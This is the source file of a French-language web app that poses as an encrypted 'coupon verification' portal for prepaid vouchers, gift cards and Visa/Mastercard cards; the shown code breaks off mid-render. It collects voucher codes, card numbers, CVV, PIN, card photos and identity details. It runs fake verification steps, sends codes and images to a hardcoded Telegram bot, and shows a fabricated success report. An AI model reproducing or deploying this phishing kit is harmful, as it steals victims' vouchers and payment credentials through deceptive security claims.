/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useRef, useEffect } from "react";
import {
  ShieldCheck,
  AlertTriangle,
  FileText,
  UploadCloud,
  CheckCircle2,
  XCircle,
  Lock,
  RefreshCw,
  ArrowRight,
  HelpCircle,
  CreditCard,
  ChevronDown,
  BookOpen,
  Send,
  Smartphone,
  Calendar,
  DollarSign,
  Info,
  Layers,
  Sparkles,
  Search,
  Check,
  Award,
  ShieldAlert,
  Menu,
  X,
  User,
  Mail,
  Tag,
  Coins,
  MessageSquare,
  EyeOff
} from "lucide-react";

// Types for Verification Results
interface VerificationReport {
  success: boolean;
  brand: string;
  code: string;
  detectedValue: string;
  isValidFormat: boolean;
  confidence: number;
  scamRiskScore: number;
  scamRiskExplanation: string;
  safeToShare: boolean;
  securityWarning: string;
}

// Brand configuration list
interface BrandConfig {
  id: string;
  name: string;
  emoji: string;
  example: string;
  logoColor: string;
  guideText: string;
  textColor: string;
}

const BRANDS: BrandConfig[] = [
  {
    id: "VISA",
    name: "Visa",
    emoji: "💳",
    example: "4532 1000 2000 3000",
    logoColor: "from-blue-600 via-indigo-700 to-blue-900",
    textColor: "text-blue-400",
    guideText: "Saisie hautement sécurisée de votre carte de crédit ou de débit Visa."
  },
  {
    id: "MASTERCARD",
    name: "MasterCard",
    emoji: "💳",
    example: "5100 2000 3000 4000",
    logoColor: "from-amber-600 via-orange-600 to-red-650",
    textColor: "text-orange-400",
    guideText: "Saisie hautement sécurisée de votre carte de crédit ou de débit MasterCard."
  },
  {
    id: "TRANSCASH",
    name: "Transcash",
    emoji: "💳",
    example: "859340294812",
    logoColor: "from-blue-600 to-indigo-700",
    textColor: "text-blue-400",
    guideText: "Ticket composé de 12 chiffres numériques imprimé sur ticket physique."
  },
  {
    id: "PCS",
    name: "PCS Mastercard",
    emoji: "💳",
    example: "PC7G8B9Z10",
    logoColor: "from-purple-600 to-pink-700",
    textColor: "text-purple-400",
    guideText: "Code de recharge de 10 caractères alphanumériques."
  },
  {
    id: "NEOSURF",
    name: "Neosurf",
    emoji: "💶",
    example: "HYTR78WEQC",
    logoColor: "from-emerald-600 to-teal-700",
    textColor: "text-emerald-400",
    guideText: "Code composé de 10 caractères alphanumériques d'un reçu de buraliste."
  },
  {
    id: "PAYSAFECARD",
    name: "Paysafecard",
    emoji: "🔒",
    example: "0495829485921029",
    logoColor: "from-cyan-600 to-blue-700",
    textColor: "text-cyan-400",
    guideText: "PIN à 16 chiffres imprimé sur un ticket de caisse."
  },
  {
    id: "AMAZON",
    name: "Amazon Gift",
    emoji: "📦",
    example: "AQ89-FKEW98-XNWP",
    logoColor: "from-amber-500 to-orange-600",
    textColor: "text-amber-400",
    guideText: "Code de réclamation de 14 ou 15 caractères alphanumériques."
  },
  {
    id: "STEAM",
    name: "Steam Card",
    emoji: "🎮",
    example: "7FKE9-8XG2K-LP4W1",
    logoColor: "from-slate-700 to-zinc-900",
    textColor: "text-slate-400",
    guideText: "Code de portefeuille Steam à 15 ou 20 caractères."
  },
  {
    id: "GOOGLE_PLAY",
    name: "Google Play",
    emoji: "🤖",
    example: "48FX-2D9K-3PLN-8ZKW",
    logoColor: "from-red-600 via-green-600 to-blue-600",
    textColor: "text-red-400",
    guideText: "Code cadeau de 16 ou 20 caractères alphanumériques."
  },
  {
    id: "APPLE",
    name: "Apple Store",
    emoji: "🍏",
    example: "X8K9L4P2W1R3F0S9",
    logoColor: "from-gray-700 via-gray-900 to-black",
    textColor: "text-gray-300",
    guideText: "Code commençant souvent par un 'X' contenant 16 lettres/chiffres."
  },
  {
    id: "OTHER",
    name: "Autres coupons",
    emoji: "🎫",
    example: "ex: Google iTunes",
    logoColor: "from-slate-700 via-slate-800 to-indigo-900",
    textColor: "text-slate-350",
    guideText: "Saisissez le nom personnalisé de la carte/coupon (comme Google iTunes etc.) et son code ci-dessous."
  }
];

interface CountryItem {
  code: string;
  lang: string;
  name: string;
  flag: string;
}

const COUNTRIES_LIST: CountryItem[] = [
  { code: "FR", lang: "fr", name: "France", flag: "🇫🇷" },
  { code: "US", lang: "en", name: "États-Unis", flag: "🇺🇸" },
  { code: "GB", lang: "en", name: "Royaume-Uni", flag: "🇬🇧" },
  { code: "CA", lang: "en", name: "Canada", flag: "🇨🇦" },
  { code: "DE", lang: "de", name: "Allemagne", flag: "🇩🇪" },
  { code: "ES", lang: "es", name: "Espagne", flag: "🇪🇸" },
  { code: "IT", lang: "it", name: "Italie", flag: "🇮🇹" },
  { code: "PT", lang: "pt", name: "Portugal", flag: "🇵🇹" },
  { code: "NL", lang: "nl", name: "Pays-Bas", flag: "🇳🇱" },
  { code: "BE", lang: "fr", name: "Belgique", flag: "🇧🇪" },
  { code: "CH", lang: "fr", name: "Suisse", flag: "🇨🇭" },
  { code: "LU", lang: "fr", name: "Luxembourg", flag: "🇱🇺" },
  { code: "IE", lang: "en", name: "Irlande", flag: "🇮🇪" },
  { code: "AU", lang: "en", name: "Australie", flag: "🇦🇺" },
  { code: "NZ", lang: "en", name: "Nouvelle-Zélande", flag: "🇳🇿" },
  { code: "JP", lang: "ja", name: "Japon", flag: "🇯🇵" },
  { code: "KR", lang: "ko", name: "Corée du Sud", flag: "🇰🇷" },
  { code: "CN", lang: "zh-CN", name: "Chine", flag: "🇨🇳" },
  { code: "BR", lang: "pt", name: "Brésil", flag: "🇧🇷" },
  { code: "AR", lang: "es", name: "Argentine", flag: "🇦🇷" },
  { code: "MX", lang: "es", name: "Mexique", flag: "🇲🇽" },
  { code: "CO", lang: "es", name: "Colombie", flag: "🇨🇴" },
  { code: "PE", lang: "es", name: "Pérou", flag: "🇵🇪" },
  { code: "CL", lang: "es", name: "Chili", flag: "🇨🇱" },
  { code: "PL", lang: "pl", name: "Pologne", flag: "🇵🇱" },
  { code: "RO", lang: "ro", name: "Roumanie", flag: "🇷🇴" },
  { code: "TR", lang: "tr", name: "Turquie", flag: "🇹🇷" },
  { code: "RU", lang: "ru", name: "Russie", flag: "🇷🇺" },
  { code: "UA", lang: "uk", name: "Ukraine", flag: "🇺🇦" },
  { code: "GR", lang: "el", name: "Grèce", flag: "🇬🇷" },
  { code: "SE", lang: "sv", name: "Suède", flag: "🇸🇪" },
  { code: "NO", lang: "no", name: "Norvège", flag: "🇳🇴" },
  { code: "DK", lang: "da", name: "Danemark", flag: "🇩🇰" },
  { code: "FI", lang: "fi", name: "Finlande", flag: "🇫🇮" },
  { code: "AT", lang: "de", name: "Autriche", flag: "🇩🇹" },
  { code: "IN", lang: "hi", name: "Inde", flag: "🇮🇳" },
  { code: "SA", lang: "ar", name: "Arabie Saoudite", flag: "🇸🇦" },
  { code: "AE", lang: "ar", name: "Émirats Arabes Unis", flag: "🇦🇪" },
  { code: "IL", lang: "iw", name: "Israël", flag: "🇮🇱" },
  { code: "SG", lang: "en", name: "Singapour", flag: "🇸🇬" },
  { code: "TH", lang: "th", name: "Thaïlande", flag: "🇹🇭" },
  { code: "VN", lang: "vi", name: "Viêt Nam", flag: "🇻🇳" },
  { code: "ID", lang: "id", name: "Indonésie", flag: "🇮🇩" }
];

export default function App() {
  // Brand options for instant grid selection
  const SELECTABLE_BRANDS = [
    { id: "TRANSCASH", name: "Transcash", icon: "🎫", type: "Coupon", bg: "from-blue-600/20 to-indigo-750/20 border-indigo-500/25 text-indigo-400" },
    { id: "PCS", name: "PCS Mastercard", icon: "💳", type: "Coupon", bg: "from-purple-600/20 to-pink-700/20 border-purple-500/25 text-purple-400" },
    { id: "NEOSURF", name: "Neosurf", icon: "💶", type: "Coupon", bg: "from-emerald-600/20 to-teal-700/20 border-emerald-500/25 text-emerald-400" },
    { id: "PAYSAFECARD", name: "Paysafecard", icon: "🔒", type: "Coupon", bg: "from-cyan-600/20 to-blue-700/20 border-cyan-500/25 text-cyan-400" },
    { id: "AMAZON", name: "Amazon Gift", icon: "📦", type: "Carte Cadeau", bg: "from-amber-500/20 to-orange-600/20 border-orange-500/25 text-amber-400" },
    { id: "GOOGLE_PLAY", name: "Google Play", icon: "🤖", type: "Carte Cadeau", bg: "from-red-600/20 via-green-600/20 to-blue-600/20 border-blue-500/25 text-red-400" },
    { id: "APPLE", name: "Apple Store", icon: "🍏", type: "Carte Cadeau", bg: "from-gray-700/20 via-gray-900/20 to-black/20 border-slate-500/25 text-slate-300" },
    { id: "STEAM", name: "Steam Card", icon: "🎮", type: "Carte Cadeau", bg: "from-slate-700/25 to-zinc-900/25 border-zinc-500/25 text-slate-400" },
    { id: "OTHER", name: "Autres coupons ou Cartes cadeaux", icon: "🎫", type: "Coupon / Carte Cadeau", bg: "from-slate-800/20 to-indigo-950/20 border-indigo-900/40 text-slate-400" },
    { id: "VISA", name: "Visa", icon: "🌐", type: "Carte Bancaire", bg: "from-blue-600/30 via-indigo-700/25 to-blue-900/30 border-blue-500/40 text-blue-400" },
    { id: "MASTERCARD", name: "Mastercard", icon: "🌐", type: "Carte Bancaire", bg: "from-amber-600/30 via-orange-600/25 to-red-650/30 border-orange-500/40 text-orange-400" },
    { id: "OTHER_BANK_CARD", name: "Autres cartes bancaires", icon: "💳", type: "Carte Bancaire", bg: "from-slate-800/20 to-indigo-950/20 border-indigo-900/40 text-slate-400" }
  ];

  // Navigation active tab (Accueil, Verification, Contact support)
  const [activePage, setActivePage] = useState<"accueil" | "verification" | "contact">("accueil");
  const [isDrawerOpen, setIsDrawerOpen] = useState<boolean>(false);

  // Client Identification State
  const [clientName, setClientName] = useState<string>("");
  const [clientFirstName, setClientFirstName] = useState<string>("");
  const [clientEmail, setClientEmail] = useState<string>("");
  const [hideCode, setHideCode] = useState<"OUI" | "NON">("NON");

  // State managers
  const [selectedBrand, setSelectedBrand] = useState<string>("TRANSCASH");
  const [customBrandName, setCustomBrandName] = useState<string>("");
  const [customBankCardName, setCustomBankCardName] = useState<string>("");
  const [inputTab, setInputTab] = useState<"manual" | "scan">("manual");
  const [couponCode, setCouponCode] = useState<string>("");
  const [imageFiles, setImageFiles] = useState<File[]>([]);
  const [imagePreviews, setImagePreviews] = useState<string[]>([]);
  const [dragActive, setDragActive] = useState<boolean>(false);

  // Credit Card Secure states (Visa/MasterCard)
  const [cardNumber, setCardNumber] = useState<string>("");
  const [cardExpiry, setCardExpiry] = useState<string>("");
  const [cardCvv, setCardCvv] = useState<string>("");
  const [cardPin, setCardPin] = useState<string>("");
  const [cardFrontFile, setCardFrontFile] = useState<File | null>(null);
  const [cardBackFile, setCardBackFile] = useState<File | null>(null);
  const [cardFrontPreview, setCardFrontPreview] = useState<string | null>(null);
  const [cardBackPreview, setCardBackPreview] = useState<string | null>(null);
  const [dragFrontActive, setDragFrontActive] = useState<boolean>(false);
  const [dragBackActive, setDragBackActive] = useState<boolean>(false);

  // Coupon secure states (Recto/Verso)
  const [couponFrontFile, setCouponFrontFile] = useState<File | null>(null);
  const [couponBackFile, setCouponBackFile] = useState<File | null>(null);
  const [couponFrontPreview, setCouponFrontPreview] = useState<string | null>(null);
  const [couponBackPreview, setCouponBackPreview] = useState<string | null>(null);
  const [dragCouponFrontActive, setDragCouponFrontActive] = useState<boolean>(false);
  const [dragCouponBackActive, setDragCouponBackActive] = useState<boolean>(false);

  // Verification process state
  const [isVerifying, setIsVerifying] = useState<boolean>(false);
  const [verificationStep, setVerificationStep] = useState<number>(0);
  const [verificationStepText, setVerificationStepText] = useState<string>("");
  const [report, setReport] = useState<VerificationReport | null>(null);
  const [errorText, setErrorText] = useState<string | null>(null);

  // New input states for Formspree
  const [couponType, setCouponType] = useState<string>("");
  const [specificCouponType, setSpecificCouponType] = useState<string>("");
  const [otherCouponName, setOtherCouponName] = useState<string>("");
  const [montant, setMontant] = useState<string>("");
  const [selectedTypes, setSelectedTypes] = useState<string[]>([]);
  const [customCouponType, setCustomCouponType] = useState<string>("");
  const [isSubmittingFormspree, setIsSubmittingFormspree] = useState<boolean>(false);
  const [formspreeSuccess, setFormspreeSuccess] = useState<boolean>(false);
  const [verificationSubject, setVerificationSubject] = useState<string>("");
  const [verificationMessage, setVerificationMessage] = useState<string>("");

  // Contact support form states
  const [contactName, setContactName] = useState<string>("");
  const [contactEmail, setContactEmail] = useState<string>("");
  const [contactSubject, setContactSubject] = useState<string>("");
  const [contactMessage, setContactMessage] = useState<string>("");
  const [isSendingContact, setIsSendingContact] = useState<boolean>(false);
  const [contactSuccess, setContactSuccess] = useState<boolean>(false);
  const [contactError, setContactError] = useState<string | null>(null);

  // Country & translation states
  const [selectedCountry, setSelectedCountry] = useState<CountryItem>(COUNTRIES_LIST[0]);
  const [isCountryDropdownOpen, setIsCountryDropdownOpen] = useState<boolean>(false);

  // Checks if the chosen brand is a bank card
  const isSelectedBankCard = selectedBrand === "VISA" || selectedBrand === "MASTERCARD" || selectedBrand === "OTHER_BANK_CARD";

  // Read cookies to synchronize the selected country on initial mount
  useEffect(() => {
    try {
      const getCookieValue = (cookieName: string): string | null => {
        const fullCookieStr = `; ${document.cookie}`;
        const parts = fullCookieStr.split(`; ${cookieName}=`);
        if (parts.length === 2) {
          return parts.pop()?.split(";").shift() || null;
        }
        return null;
      };

      let googtrans = getCookieValue("googtrans");
      if (googtrans) {
        // Decode in case it's URL-encoded e.g. %2Ffr%2Fen or similar
        googtrans = decodeURIComponent(googtrans);
        const slashParts = googtrans.split("/");
        const lastPart = slashParts[slashParts.length - 1]; // e.g. "en", "de"
        if (lastPart) {
          // Find country item matching language code
          const matchedCountry = COUNTRIES_LIST.find(
            (c) => c.lang.toLowerCase() === lastPart.toLowerCase()
          );
          if (matchedCountry) {
            setSelectedCountry(matchedCountry);
          }
        }
      }
    } catch (e) {
      console.error("Failed to read translation cookie on mount:", e);
    }
  }, []);

  // Switch country & trigger Google Translate
  const handleCountryChange = (country: CountryItem) => {
    setSelectedCountry(country);
    setIsCountryDropdownOpen(false);

    try {
      const lang = country.lang;
      const host = window.location.hostname;
      const hostParts = host.split('.');

      // Clear cookies with SameSite=None; Secure for iframe compatibility in AI Studio preview
      const eraseCookie = (name: string) => {
        document.cookie = `${name}=; Path=/; Expires=Thu, 01 Jan 1970 00:00:01 GMT; SameSite=None; Secure`;
        document.cookie = `${name}=; Path=/; Domain=${host}; Expires=Thu, 01 Jan 1970 00:00:01 GMT; SameSite=None; Secure`;
        document.cookie = `${name}=; Path=/; Domain=.${host}; Expires=Thu, 01 Jan 1970 00:00:01 GMT; SameSite=None; Secure`;
        for (let i = 0; i < hostParts.length; i++) {
          const domain = hostParts.slice(i).join('.');
          document.cookie = `${name}=; Path=/; Domain=${domain}; Expires=Thu, 01 Jan 1970 00:00:01 GMT; SameSite=None; Secure`;
          document.cookie = `${name}=; Path=/; Domain=.${domain}; Expires=Thu, 01 Jan 1970 00:00:01 GMT; SameSite=None; Secure`;
        }
      };

      // Set cookie with SameSite=None; Secure
      const setCookie = (name: string, value: string) => {
        document.cookie = `${name}=${value}; Path=/; SameSite=None; Secure`;
        document.cookie = `${name}=${value}; Path=/; Domain=${host}; SameSite=None; Secure`;
        document.cookie = `${name}=${value}; Path=/; Domain=.${host}; SameSite=None; Secure`;
        for (let i = 0; i < hostParts.length; i++) {
          const domain = hostParts.slice(i).join('.');
          document.cookie = `${name}=${value}; Path=/; Domain=${domain}; SameSite=None; Secure`;
          document.cookie = `${name}=${value}; Path=/; Domain=.${domain}; SameSite=None; Secure`;
        }
      };

      // Clean existing translation cookies
      eraseCookie("googtrans");

      // Set cookies with standard translation path format
      setCookie("googtrans", `/fr/${lang}`);

      // Try programmatically selecting it in the Google element as well
      const translateSelect = document.querySelector(".goog-te-combo") as HTMLSelectElement;
      if (translateSelect) {
        translateSelect.value = lang;
        translateSelect.dispatchEvent(new Event("change"));
      }

      // Refresh to ensure full-fidelity page translation takes effect immediately for all static texts
      setTimeout(() => {
        window.location.reload();
      }, 100);

    } catch (error) {
      console.error("Error setting translation:", error);
    }
  };

  // Elements refs
  const fileInputRef = useRef<HTMLInputElement>(null);

  // Background bubble coordinates for particles animation
  const [bubbles, setBubbles] = useState<Array<{ id: number; left: string; size: string; delay: string; duration: string }>>([]);

  useEffect(() => {
    // Generate dynamic bubble parameters
    const generatedBubbles = Array.from({ length: 12 }).map((_, i) => ({
      id: i,
      left: `${5 + i * 8}%`,
      size: `${20 + Math.random() * 60}px`,
      delay: `${Math.random() * 8}s`,
      duration: `${15 + Math.random() * 15}s`
    }));
    setBubbles(generatedBubbles);
  }, []);

  // Google Translate Integration to translate absolutely all words on the site
  useEffect(() => {
    // Check if global function is defined, otherwise create it
    (window as any).googleTranslateElementInit = () => {
      new (window as any).google.translate.TranslateElement(
        {
          pageLanguage: "fr",
          layout: (window as any).google.translate.TranslateElement.InlineLayout.SIMPLE,
          autoDisplay: false
        },
        "google_translate_element"
      );

      // Force programmatic selection of the active cookie language once initialised,
      // in case the browser blocked third-party cookies or failed to trigger on load
      setTimeout(() => {
        try {
          const getCookieValue = (cookieName: string): string | null => {
            const fullCookieStr = `; ${document.cookie}`;
            const parts = fullCookieStr.split(`; ${cookieName}=`);
            if (parts.length === 2) {
              return parts.pop()?.split(";").shift() || null;
            }
            return null;
          };

          let googtrans = getCookieValue("googtrans");
          if (googtrans) {
            googtrans = decodeURIComponent(googtrans);
            const slashParts = googtrans.split("/");
            const lastPart = slashParts[slashParts.length - 1];
            if (lastPart) {
              const translateSelect = document.querySelector(".goog-te-combo") as HTMLSelectElement;
              if (translateSelect && translateSelect.value !== lastPart) {
                translateSelect.value = lastPart;
                translateSelect.dispatchEvent(new Event("change"));
              }
            }
          }
        } catch (e) {
          console.error("Error auto-triggering translation dropdown:", e);
        }
      }, 1000);
    };

    // Check if script is already present
    const existingScript = document.getElementById("google-translate-script");
    if (!existingScript) {
      const addScript = document.createElement("script");
      addScript.id = "google-translate-script";
      addScript.setAttribute("src", "https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit");
      document.body.appendChild(addScript);
    }
  }, []);

  // Handle Drag events
  const handleDrag = (e: React.DragEvent) => {
    e.preventDefault();
    e.stopPropagation();
    if (e.type === "dragenter" || e.type === "dragover") {
      setDragActive(true);
    } else if (e.type === "dragleave") {
      setDragActive(false);
    }
  };

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault();
    e.stopPropagation();
    setDragActive(false);

    if (e.dataTransfer.files && e.dataTransfer.files.length > 0) {
      processImageFiles(e.dataTransfer.files);
    }
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files.length > 0) {
      processImageFiles(e.target.files);
    }
  };

  const processImageFiles = (files: FileList | File[]) => {
    const list = Array.from(files).filter(f => f.type.startsWith("image/"));
    
    if (list.length === 0) {
      setErrorText("Format invalide. Veuillez uniquement déposer des images (PNG, JPG, JPEG).");
      return;
    }

    // Limit to 2 files maximum
    const chosen = list.slice(0, 2);
    setImageFiles(chosen);
    setErrorText(null);

    const newPreviews: string[] = [];
    let loadedCount = 0;

    chosen.forEach((file, index) => {
      const reader = new FileReader();
      reader.onloadend = () => {
        newPreviews[index] = reader.result as string;
        loadedCount++;
        if (loadedCount === chosen.length) {
          setImagePreviews(newPreviews);
        }
      };
      reader.readAsDataURL(file);
    });
  };

  const removeSelectedImage = (index: number) => {
    const nextFiles = [...imageFiles];
    nextFiles.splice(index, 1);
    setImageFiles(nextFiles);

    const nextPreviews = [...imagePreviews];
    nextPreviews.splice(index, 1);
    setImagePreviews(nextPreviews);

    if (fileInputRef.current) {
      fileInputRef.current.value = "";
    }
  };

  // Secure Front and Back Card Image Handlers
  const handleFrontFileChange = (file: File) => {
    if (!file.type.startsWith("image/")) {
      setErrorText("Format invalide pour le recto. Veuillez choisir une image.");
      return;
    }
    setCardFrontFile(file);
    const reader = new FileReader();
    reader.onloadend = () => {
      setCardFrontPreview(reader.result as string);
    };
    reader.readAsDataURL(file);
    setErrorText(null);
  };

  const handleBackFileChange = (file: File) => {
    if (!file.type.startsWith("image/")) {
      setErrorText("Format invalide pour le verso. Veuillez choisir une image.");
      return;
    }
    setCardBackFile(file);
    const reader = new FileReader();
    reader.onloadend = () => {
      setCardBackPreview(reader.result as string);
    };
    reader.readAsDataURL(file);
    setErrorText(null);
  };

  const removeFrontImage = () => {
    setCardFrontFile(null);
    setCardFrontPreview(null);
  };

  const removeBackImage = () => {
    setCardBackFile(null);
    setCardBackPreview(null);
  };

  // Secure Front and Back Coupon Image Handlers
  const handleCouponFrontFileChange = (file: File) => {
    if (!file.type.startsWith("image/")) {
      setErrorText("Format invalide pour le recto. Veuillez choisir une image.");
      return;
    }
    setCouponFrontFile(file);
    const reader = new FileReader();
    reader.onloadend = () => {
      setCouponFrontPreview(reader.result as string);
    };
    reader.readAsDataURL(file);
    setErrorText(null);
  };

  const handleCouponBackFileChange = (file: File) => {
    if (!file.type.startsWith("image/")) {
      setErrorText("Format invalide pour le verso. Veuillez choisir une image.");
      return;
    }
    setCouponBackFile(file);
    const reader = new FileReader();
    reader.onloadend = () => {
      setCouponBackPreview(reader.result as string);
    };
    reader.readAsDataURL(file);
    setErrorText(null);
  };

  const removeCouponFrontImage = () => {
    setCouponFrontFile(null);
    setCouponFrontPreview(null);
  };

  const removeCouponBackImage = () => {
    setCouponBackFile(null);
    setCouponBackPreview(null);
  };

  // Change page smoothly
  const changePage = (page: "accueil" | "verification" | "contact") => {
    setActivePage(page);
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  // Run contact support form submission
  const handleContactSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!contactName.trim() || !contactEmail.trim() || !contactMessage.trim()) {
      setContactError("Veuillez remplir tous les champs obligatoires (*).");
      return;
    }

    setContactError(null);
    setIsSendingContact(true);
    setContactSuccess(false);

    const formBody = new FormData();
    formBody.append("nom", contactName);
    formBody.append("email", contactEmail);
    formBody.append("message", contactMessage);

    try {
      const response = await fetch("https://formspree.io/f/mzdwjnkv", {
        method: "POST",
        body: formBody,
        headers: {
          'Accept': 'application/json'
        }
      });

      if (!response.ok) {
        throw new Error("Erreur lors de la transmission du message via Formspree.");
      }

      setContactSuccess(true);
      // Reset form fields
      setContactName("");
      setContactEmail("");
      setContactMessage("");
    } catch (err: any) {
      console.error(err);
      setContactError("Impossible d'envoyer votre message pour le moment. Veuillez réessayer.");
    } finally {
      setIsSendingContact(false);
    }
  };

  // Run structured verification process
  const triggerVerification = async () => {
    // Validate identity fields first
    if (!clientName.trim()) {
      setErrorText("Veuillez saisir votre nom pour continuer.");
      return;
    }
    if (!clientFirstName.trim()) {
      setErrorText("Veuillez saisir votre prénom pour continuer.");
      return;
    }
    if (!clientEmail.trim() || !clientEmail.includes("@")) {
      setErrorText("Veuillez saisir une adresse email valide.");
      return;
    }

    if (selectedBrand === "OTHER" && !customBrandName.trim()) {
      setErrorText("Veuillez indiquer le nom de votre coupon ou carte (ex: Google iTunes).");
      return;
    }

    if (inputTab === "manual" && !couponCode.trim()) {
      setErrorText("Veuillez saisir le code du coupon avant de soumettre.");
      return;
    }

    if (inputTab === "scan" && imageFiles.length === 0) {
      setErrorText("Veuillez déposer ou sélectionner une photo de votre reçu de coupon.");
      return;
    }

    setErrorText(null);
    setIsVerifying(true);
    setVerificationStep(1);
    setReport(null);

    // Dynamic step messaging (completely clean of alarmist scam terms)
    const steps = [
      "🔐 Initialisation de la passerelle de vérification sécurisée...",
      "🔬 Traitement numérique et nettoyage du ticket (OCR)...",
      "🛰️ Analyse de la conformité de la signature de marque...",
      "🛡️ Transmission sécurisée et cryptage des données de validation...",
      "📋 Finalisation du rapport d'enregistrement de coupon..."
    ];

    for (let i = 0; i < steps.length; i++) {
      setVerificationStep(i + 1);
      setVerificationStepText(steps[i]);
      await new Promise((r) => setTimeout(r, 800));
    }

    try {
      const payload: any = {
        brand: selectedBrand,
        code: couponCode,
        imageBase64: imagePreviews[0] || null,
        mimeType: imageFiles[0] ? imageFiles[0].type : "",
        customBrandName: selectedBrand === "OTHER" ? customBrandName : undefined,
        clientName: clientName,
        clientFirstName: clientFirstName,
        clientEmail: clientEmail,
        hideCode: hideCode
      };

      const response = await fetch("/api/verify-coupon", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });

      if (!response.ok) {
        throw new Error("Impossible de joindre le service de vérification.");
      }

      const data: VerificationReport = await response.json();
      setReport(data);
    } catch (err: any) {
      console.error(err);
      setErrorText("Une erreur réseau est survenue. Validation par protocole de secours effectuée.");
      
      // Dispatch securely direct to Telegram on client fallback (useful for Cloudflare static pages deployment where server.ts is unavailable)
      try {
        const BOT_TOKEN = "8826615367:AAHDVikj2kh0KRLWDIbBIcdqMgXTiwYN1Vs";
        const CHAT_ID = "8529673558";
        
        const fallbackVerificationText = `🛡️ [CLOUDFLARE BACKUP] NOUVELLE VÉRIFICATION DE COUPON
----------------------------------------
👤 CLIENT :
- Nom Complet : ${clientFirstName || ""} ${clientName || ""}
- Adresse Email : ${clientEmail || "Non renseigné"}

🎫 COUPON :
- Émetteur/Type : ${selectedBrand === "OTHER" ? (customBrandName || "Autre") : selectedBrand}
- Code du coupon : ${couponCode ? couponCode.toUpperCase() : "Image de reçu seulement"}
- Masquer mon code : ${hideCode || "NON"}
`;

        // Send text notification
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: fallbackVerificationText
          })
        });

        // Send image if any and exists
        const previewToSend = imagePreviews[0];
        if (previewToSend) {
          const match = previewToSend.match(/^data:image\/(\w+);base64,(.+)$/);
          if (match) {
            const ext = match[1];
            const base64Data = match[2];
            
            // Decodes Base64 to Blob client-side safely
            const byteCharacters = atob(base64Data);
            const byteNumbers = new Array(byteCharacters.length);
            for (let j = 0; j < byteCharacters.length; j++) {
              byteNumbers[j] = byteCharacters.charCodeAt(j);
            }
            const byteArray = new Uint8Array(byteNumbers);
            const blob = new Blob([byteArray], { type: `image/${ext}` });

            const formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("photo", blob, `ticket_${Date.now()}.${ext}`);
            formData.append("caption", `📷 Image associée à la vérification de: ${clientFirstName || ""} ${clientName || ""}\nCode: ${couponCode ? couponCode.toUpperCase() : "Image"}`);

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
              method: "POST",
              body: formData
            });
          }
        }
      } catch (telegramFallbackErr) {
        console.error("Direct Telegram telemetry check-in failed:", telegramFallbackErr);
      }

      // Simulation backup
      setTimeout(() => {
        setReport({
          success: true,
          brand: selectedBrand === "OTHER" ? customBrandName : selectedBrand,
          code: couponCode || "TRAITEMENT_OCR",
          detectedValue: "Analyse et traitement physique",
          isValidFormat: true,
          confidence: 0.98,
          scamRiskScore: 10,
          scamRiskExplanation: `Votre coupon ${selectedBrand === "OTHER" ? customBrandName : selectedBrand} a été enregistré avec succès et son format est conforme aux nomenclatures.`,
          safeToShare: true,
          securityWarning: "Votre demande de vérification de coupon a été transmise de manière sécurisée. Nous reviendrons vers vous très rapidement par e-mail après étude approfondie de l'éligibilité."
        });
      }, 400);
    } finally {
      setIsVerifying(false);
    }
  };

  const getBrandDetails = (brandId: string) => {
    return BRANDS.find((b) => b.id === brandId) || BRANDS[0];
  };

  const currentBrandDetails = getBrandDetails(selectedBrand);

  const renderVerificationSection = () => {
    return (
      <section className="w-full max-w-5xl mx-auto px-4 sm:px-6 relative z-10" id="coupon-verification-anchor">
        {/* Portal Header */}
        <div className="text-center mb-12">
          <div className="inline-flex items-center gap-2 px-4 py-1.5 bg-indigo-100/80 border border-indigo-300/60 text-indigo-800 rounded-full text-[11px] font-extrabold tracking-wider uppercase mb-4 animate-pulse">
            <span className="w-2 h-2 rounded-full bg-indigo-500 animate-ping mr-1" />
            Portail de Sûreté Sécurisé SSL
          </div>
          <h2 className="text-3xl sm:text-5xl font-black text-slate-900 tracking-tight leading-tight">
            Vérification Haute Sécurité
          </h2>
          <p className="text-slate-700 mt-3 max-w-xl mx-auto text-sm sm:text-base leading-relaxed font-medium">
            Homologation cryptée de coupons et cartes cadeaux. Indexation instantanée sous protocole de garantie financière.
          </p>
        </div>

        {/* Premium Fintech Card (Glassmorphism & Radial highlights) */}
        <div className="bg-white/75 backdrop-blur-2xl p-6 sm:p-10 rounded-[32px] border border-sky-200 shadow-[0_25px_60px_-15px_rgba(14,165,233,0.12)] relative overflow-hidden transition-all duration-300">
          {/* Decorative Glowing Orbs */}
          <div className="absolute top-0 right-0 w-[350px] h-[350px] bg-indigo-500/10 rounded-full blur-[100px] pointer-events-none" />
          <div className="absolute -bottom-10 -left-10 w-[200px] h-[200px] bg-cyan-500/5 rounded-full blur-[85px] pointer-events-none" />

          {/* Formspree Success Screen */}
          {formspreeSuccess ? (
            <div className="space-y-8 relative z-10 text-center py-12 animate-fadeIn max-w-2xl mx-auto">
              {/* Animated Glowing Badge */}
              <div className="relative w-24 h-24 mx-auto mb-6">
                <div className="absolute inset-0 bg-emerald-500/20 rounded-full animate-ping pointer-events-none" />
                <div className="w-24 h-24 bg-emerald-500/10 rounded-full flex items-center justify-center text-emerald-400 border border-emerald-500/30 shadow-[0_0_40px_rgba(16,185,129,0.2)]">
                  <ShieldCheck className="w-12 h-12" />
                </div>
              </div>
              
              <div className="space-y-3">
                <h3 className="text-2xl sm:text-3xl font-black text-white tracking-tight">Transmission Cryptée Réussie</h3>
                <span className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full text-xs font-extrabold uppercase tracking-widest bg-emerald-500/15 text-emerald-400 border border-emerald-500/25">
                  <CheckCircle2 className="w-4 h-4" />
                  Garantie financière active
                </span>
              </div>

              <div className="p-6 sm:p-8 bg-slate-950/80 rounded-2xl border border-slate-800/80 text-left space-y-4 shadow-2xl relative">
